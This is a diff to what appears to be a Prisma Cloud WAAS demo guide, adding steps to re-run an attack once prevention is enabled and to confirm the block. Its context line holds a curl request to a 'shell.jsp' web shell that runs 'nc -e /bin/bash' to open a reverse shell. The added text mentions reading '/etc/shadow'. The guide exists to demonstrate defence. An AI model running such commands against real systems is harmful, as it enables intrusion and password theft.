@@ -103,6 +103,8 @@ curl --output - http://<Vuln App IP Address>/shell.jsp?cmd=nc%20-e%20/bin/bash%2
     - Show the Events under **Compute > Monitor > Events > WAAS for Hosts**.  If there are mutiple counts, Zoom in on the latest.
 3. Prevent the Code Injection & Local File Inclusion Attacks
     - Edit the Host WAAS Rule to Prevent
+    - Re-run attack and should receive errors now and unable to gain passwords from the `cat /etc/shadow` command that runs in the script
+    - Show in Primsa Cloud the event was Blocked/Prevented
 
 ## Cleanup
 1. Disable Host WAAS rule
